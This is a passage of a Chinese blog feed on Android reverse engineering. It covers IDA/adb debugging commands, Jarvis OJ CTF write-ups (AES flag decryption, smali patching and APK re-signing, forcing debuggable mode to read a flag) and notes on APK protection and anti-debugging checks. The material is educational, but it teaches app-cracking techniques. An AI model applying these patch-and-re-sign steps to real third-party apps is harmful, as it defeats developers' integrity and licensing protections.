<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/81bf07f6-3978-4d13-aa30-7b76c868192d/Screenshot_20210317-170013.png" class="lazyload" data-srcset="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/81bf07f6-3978-4d13-aa30-7b76c868192d/Screenshot_20210317-170013.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/81bf07f6-3978-4d13-aa30-7b76c868192d/Screenshot_20210317-170013.png"></p>
<p>打开ddms可以发现被挂起的进程名之前出现红虫虫。</p>
<p><img src="https://z3.ax1x.com/2021/03/25/6L8yLT.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6L8yLT.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<p>打开IDA进行attach，选择进程，进入调试窗口。</p>
<p><img src="https://z3.ax1x.com/2021/03/25/6L8ceU.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6L8ceU.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<p><img src="https://z3.ax1x.com/2021/03/25/6L8syV.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6L8syV.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<p>勾选三个调试器选项（程序入口点，线程启动终止，库加载卸载），F9运行，此时标题显示“running”。</p>
<p><img src="https://z3.ax1x.com/2021/03/25/6L8WFJ.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6L8WFJ.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<p>释放程序，此时在ddms中发现红虫虫变绿虫虫，此时程序中的提示窗口消失，程序正常运行。</p>
<p><img src="https://z3.ax1x.com/2021/03/25/6L8fY9.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6L8fY9.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<p>在IDA的模块窗口搜索，若未发现目标库则继续运行，随后即可发现目标库被加载到IDA，开始调试。</p>
<img src="https://z3.ax1x.com/2021/03/25/6L8hWR.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6L8hWR.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:50%;" />

<p>Command List：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./data/user/tmp/as</span><br><span class="line">adb forward tcp:23946 tcp:23946</span><br><span class="line">adb shell am start -D -n 包名/包名+类名</span><br><span class="line">jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=pid</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>AndroidRe</tag>
        <tag>Summary</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Re</title>
    <url>/2020/10/30/Android_Re/</url>
    <content><![CDATA[<p>​        安卓逆向入门入门。<span id="more"></span>最近可算开始学安卓逆向了，先刷刷jarvis oj上的题康康。</p>
<h2 id="0x00-Smail"><a href="#0x00-Smail" class="headerlink" title="0x00 . Smail"></a>0x00 . Smail</h2><p>​        题目只给了一个.smail文件。smail是Davlik虚拟机的寄存器语言，相当于pc平台的汇编语言，可以看出个大概逻辑。</p>
<p>​        不过当然可以借助<strong>Smail2java</strong>工具，将其转换成.java文件。</p>
<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214537.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214537.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102194054808"></p>
<p>​        java如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> net.bluelotus.tomorrow.easyandroid;</span><br><span class="line"><span class="keyword">import</span> android.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.NoSuchPaddingException;</span><br><span class="line"><span class="keyword">import</span> java.security.InvalidKeyException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.IllegalBlockSizeException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.BadPaddingException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> java.security.Key;</span><br><span class="line"><span class="keyword">import</span> java.security.GeneralSecurityException;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Crackme</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String str2 = <span class="string">&quot;cGhyYWNrICBjdGYgMjAxNg==&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Crackme</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        GetFlag(<span class="string">&quot;sSNnx1UKbYrA1+MOrdtDTA==&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">GetFlag</span><span class="params">(String p1)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] <span class="string">&quot;content&quot;</span> = Base64.decode(p1.getBytes(), <span class="number">0x0</span>);</span><br><span class="line">        String <span class="string">&quot;kk&quot;</span> = <span class="keyword">new</span> String(Base64.decode(str2.getBytes(), <span class="number">0x0</span>));</span><br><span class="line">        System.out.println(decrypt(<span class="string">&quot;content&quot;</span>, <span class="string">&quot;kk&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">decrypt</span><span class="params">(<span class="keyword">byte</span>[] p1, String p2)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String <span class="string">&quot;m&quot;</span> = <span class="number">0x0</span>;</span><br><span class="line">        <span class="keyword">try</span> </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] <span class="string">&quot;keyStr&quot;</span> = p2.getBytes();</span><br><span class="line">            SecretKeySpec <span class="string">&quot;key&quot;</span> = <span class="keyword">new</span> SecretKeySpec(<span class="string">&quot;keyStr&quot;</span>, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">            Cipher <span class="string">&quot;cipher&quot;</span> = Cipher.getInstance(<span class="string">&quot;AES/ECB/NoPadding&quot;</span>);</span><br><span class="line">            <span class="string">&quot;cipher&quot;</span>.init(<span class="number">0x2</span>, <span class="string">&quot;key&quot;</span>);</span><br><span class="line">            <span class="keyword">byte</span>[] <span class="string">&quot;result&quot;</span> = <span class="string">&quot;cipher&quot;</span>.doFinal(p1);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;m&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(NoSuchPaddingException <span class="string">&quot;e&quot;</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;e&quot;</span>.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>  <span class="string">&quot;m&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        一开始一直在纠结Cipher.getInstance啥的看不懂，然后打算丢去eclipse或者Android Studio直接跑但是碰到一堆编译问题，十分头疼。看了看解析，原来只要明白是AES加密就可以了（果然逆向还是得专注关键代码），于是用python解码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">code = base64.b64decode(<span class="string">&quot;sSNnx1UKbYrA1+MOrdtDTA==&quot;</span>)</span><br><span class="line">key = base64.b64decode(<span class="string">&quot;cGhyYWNrICBjdGYgMjAxNg==&quot;</span>)</span><br><span class="line">aes=AES.new(key,AES.MODE_ECB)</span><br><span class="line"><span class="built_in">print</span> aes.decrypt(code)</span><br></pre></td></tr></table></figure>



<h2 id="0x01-爬楼梯"><a href="#0x01-爬楼梯" class="headerlink" title="0x01 . 爬楼梯"></a>0x01 . 爬楼梯</h2><p>​        安装apk并打开，是一个爬楼小游戏，点击按钮爬楼，爬到了就能看flag。</p>
<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214604.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214604.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102194614631"></p>
<p>​        看到这第一时间想到了八门神器，直接给root权限然后修改已爬楼层就完事。但是莫名其妙的是八门神器好像不适配模拟器的安卓版本（7.1.2），模拟器已经分配了超级用户权限，但是打开八门依旧提示没有root权限。</p>
<p>​        于是反汇编apk，研究研究逻辑。</p>
<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214620.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214620.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102195434583"></p>
<p>​        确实是爬到楼层即可看flag，不过楼层数每次打开都是个随机数，该随机数要对32进行取余，因此有一定概率在打开后发现楼层数为0，可以直接拿flag。</p>
<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214646.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214646.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102195634024"></p>
<p>​        不过还是采用专业办法，用mt管理器解压，Dex编辑器查看dex文件。</p>
<p>​            <img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214653.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214653.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102195859981" style="zoom: 70%;" /><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214706.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214706.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102195859981" style="zoom: 70%;" /></p>
<p>​        接着找到MainActivity()。</p>
<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214723.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214723.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102201112453"></p>
<p>​        发现第一行处v5被初始化为0，8-9行处用v5初始化v0，然后将v0的值用作参数调用flag组件的 setClickable()函数。也就是说将v5初始化值改为1即可使得flag组件一直处于clickable。</p>
<p>​        改了之后在右上角点击保存，退出再保存一次，然后一路退出。</p>
<p>​                                  <img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214759.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214759.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102201750895"><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214806.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214806.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102201815452"></p>
<p>​        然后全选(左右划动选择)，长按压缩，选择apk模式。</p>
<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214831.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214831.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102201921740"></p>
<p>​        然后长按CFF.apk，功能-apk签名。</p>
<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214843.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214843.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102202122718"></p>
<p>​        然后安装，拿到flag。</p>
<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214903.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214903.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102202211016"></p>
<h2 id="0x02-FindPass"><a href="#0x02-FindPass" class="headerlink" title="0x02 . FindPass"></a>0x02 . FindPass</h2><p>​        模拟器安装apk打开瞅瞅。</p>
<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214934.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214934.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102204609589"></p>
<p>​        jeb反编译apk瞅瞅。</p>
<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102215016.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102215016.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102204746910"></p>
<p>​        比较输入的字符串(v5)和v4是否一致，一致则得到flag。</p>
<p>​        在运行过程中，v4必然会存储到内存中，因此我们可以动调查看。在模拟器文件夹打开终端，输入以下命令，得到模拟器端口号。</p>
<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102215035.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102215035.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102205650515"></p>
<p>​        然后再用系统的adb连接上端口。</p>
<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102215224.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102215224.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102205913832"></p>
<p>​        在模拟器打开app，然后在jeb打开调试器，选择开始调试，就可以找到模拟器的进程。</p>
<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102215255.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102215255.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102205955349"></p>
<p>​        附上之后开始调试。</p>
<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102215312.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102215312.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102210110443"></p>
<p>​    发现报错，原来是apk设置成了不可调试。用apktools反编译出来，然后修改xml，在application标签中加上**android:debuggable=”true”**并用空格隔开。</p>
<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102215356.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102215356.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102210652338"></p>
<p>​        重新调试，在标签90处下断点，已知v9中存的就是v4的flag。</p>
<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102215407.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102215407.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102211030315"></p>
<p>​        查看局部变量列表，即可发现flag。</p>
<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102215436.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102215436.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102211410089"></p>
<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102215448.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102215448.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102211451659"></p>
]]></content>
      <tags>
        <tag>AndroidRe</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Protection</title>
    <url>/2021/03/08/Android%20Protection/</url>
    <content><![CDATA[<p>关于APK包的保护以及代码的反调试方法。<span id="more"></span></p>
<h1 id="APK保护"><a href="#APK保护" class="headerlink" title="APK保护"></a>APK保护</h1><h2 id="Java代码混淆"><a href="#Java代码混淆" class="headerlink" title="Java代码混淆"></a>Java代码混淆</h2><p>通常为了提高代码可读性，开发者会给各个标识赋予相应的意义，包名类名都会经过相应的命名。但是当程序被打包时，不需要考虑可读性，因为包名类名或者标识符只需要能准确寻址即可，于是开发者会对可执行文件的源代码进行混淆，这样可以一定程度的增加逆向过程中所需的时间。</p>
<p><img src="https://z3.ax1x.com/2021/03/25/6LYZLV.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LYZLV.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<p>低可读性可以劝退一部分逆向者，但是本质上来说，整个代码的逻辑并没有改变，因此并不能一劳永逸地解决代码保护的问题。</p>
<h2 id="资源文件混淆"><a href="#资源文件混淆" class="headerlink" title="资源文件混淆"></a>资源文件混淆</h2><p>类似代码混淆，降低资源id和资源文件名的可读性。</p>
<h2 id="签名验证"><a href="#签名验证" class="headerlink" title="签名验证"></a>签名验证</h2><p>某些apk文件解压后，发现里面存在MANIFEST.MF文件，这就是apk的签名文件。</p>
<p>签名文件中保存着apk文件的信息摘要并进行了加密，如果通过逆向对apk进行重新打包，会使得签名文件与原文件不一致，无法通过签名校验。</p>
<p>签名验证方式很多，以下例子是被定义在native层的三个签名相关函数，人送爱称“签名三兄弟”。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">getPackageName()</span><br><span class="line">getPackageManage()</span><br><span class="line">getPackageInfo()</span><br></pre></td></tr></table></figure>

<p>签名验证可以通过修改程序逻辑进行绕过，实际情况实际分析。</p>
<h1 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h1><h2 id="关键文件检测"><a href="#关键文件检测" class="headerlink" title="关键文件检测"></a>关键文件检测</h2><p>遍历**/data/local/tmp<strong>路径，查找是否存在</strong>android_server<strong>，</strong>android_server64**这样的文件。如果存在则杀死当前进程。</p>
<h2 id="调试端口检测"><a href="#调试端口检测" class="headerlink" title="调试端口检测"></a>调试端口检测</h2><p>一些调试器在调试安卓程序时会占用默认的端口，例如IDA使用的端口：<strong>23946</strong>。检验占用这些端口的进程即可轻易判断程序是否被调试。</p>
<p>但换成非默认端口即可绕过。</p>
<h2 id="进程名称检测"><a href="#进程名称检测" class="headerlink" title="进程名称检测"></a>进程名称检测</h2><p>Android系统中(其实Linux也是)，每个进程运行时都会生成一个对应的文件夹，路径为**/proc/pid/<strong>，其<a href="https://blog.csdn.net/zdwzzu2006/article/details/7747977">目录</a>下的</strong>status**文件用于记录进程状态。而status文件中的Tracerid字段，又用于记录当前进程的调试进程pid。</p>
